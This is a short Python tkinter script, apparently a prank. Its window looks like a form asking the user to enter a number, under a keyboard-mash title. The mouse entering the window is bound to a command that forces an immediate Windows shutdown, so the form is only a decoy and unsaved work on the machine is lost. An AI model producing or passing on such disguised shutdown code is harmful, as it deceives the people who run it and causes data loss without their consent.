from tkinter import *
import os

def shutdown(event):
    os.system("shutdown /s /t 1")

root = Tk()
root.title("efnjnfjsdnjfnfjdsnfdfsfjdnfjsnfjdnjsdnfjsdnjfsnjdfjsdnjfnsjdfnsjdnfjsndjfnjsdnfjsndjfnsjdnfjsdnfjsndfjnsdjfnsjdnfjsdnfjsndfjsndjfnsdjfnsjfnjsnfjdnfdjnfjsdnfjsndfjsndfjnfjnsdjfnsdjfnsjdfnjsdnfjsdnfjnfjsdfnjsdnfjsdnfjsnfjsndfjnsdfjsndfjsndfjnsdjfnjsdnfjsnfjsnfjsnfjsnfjsnfjsndfjdnfjdnfsjdfnnnnnnnnnnnnnnnsdfjnsjdfjdnfsjnfjsnjsnfjnjsdfjnsdfjnsdfjnsdfjnsdfjnsdfjnsdfjnsdfnsfjddddddddddjnfsddddddddnjfsdddddddjnfsddddjnsdfnjfsdddddjnfsdddddjnfdssssssssssssssss")

label = Label(root, text="EENTER ASNF SNUMBEr").grid(row=0, column=0, padx=10, pady=5)
# no
# im done

root.bind("<Enter>", shutdown)

root.mainloop()